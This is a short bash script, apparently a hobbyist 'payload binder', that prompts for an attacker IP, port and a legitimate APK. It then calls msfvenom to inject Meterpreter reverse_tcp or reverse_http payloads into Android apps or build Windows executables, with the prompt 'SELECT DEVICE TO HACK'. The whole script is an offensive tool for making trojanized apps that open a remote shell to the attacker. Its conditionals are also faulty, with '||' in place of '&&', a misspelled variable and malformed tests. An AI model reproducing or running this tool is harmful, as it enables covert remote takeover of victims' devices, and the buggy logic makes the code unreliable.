echo "<<<<<<<<<<<<<<<<<PAYLOAD_BINDER_BY_227nona_(NONASTONA)>>>>>>>>>>>>>>>>>"
read -p "YOUR LOCAL_IP::" ip
read -p "YOUR PORT::" port
read -p "OPTPUT NAME OF PAYLOAD::" name
read -p "ENTER THE PATH OF YOUR APK YOU WANT TO INJECT(/root/Downloads/app.apk)::" location
echo "1.android 2.windows"
read -p "SELECT DEVICE TO HACK(1 , 2)::" device
if [ $device = 1 ]
then
echo "1.android_reverse_tcp 2.android_reverse_http"
read -p "ENTER PAYLOAD TYPE(1 , 2)::" apayload
elif [ $device = 2 ]
then
echo "1.windows_meterpreter_tcp 2.windows_meterpreter_http"
read -p "SELECT PAYLOAD TYPE(1 , 2)::" wpayload
else
echo "wrong input"
exit
fi
#LOGICAL UNIT
if [ $device = 1 ] || [ $apaylod = 1 ]
then
msfvenom -x $location -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $name.apk
elif [ $device = 1 ] || [ $apayload =2 ]
then
msfvenom -x $location -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port -o $name.apk
elif [ $device = 2 ] || [ $wpayload =1 ]
then
msfvenom -x $location -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $name.exe
elif [ $device = 2] || [ $wpayload = 2 ]
then
msfvenom -x $location -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -o $name.exe
else
exit
fi
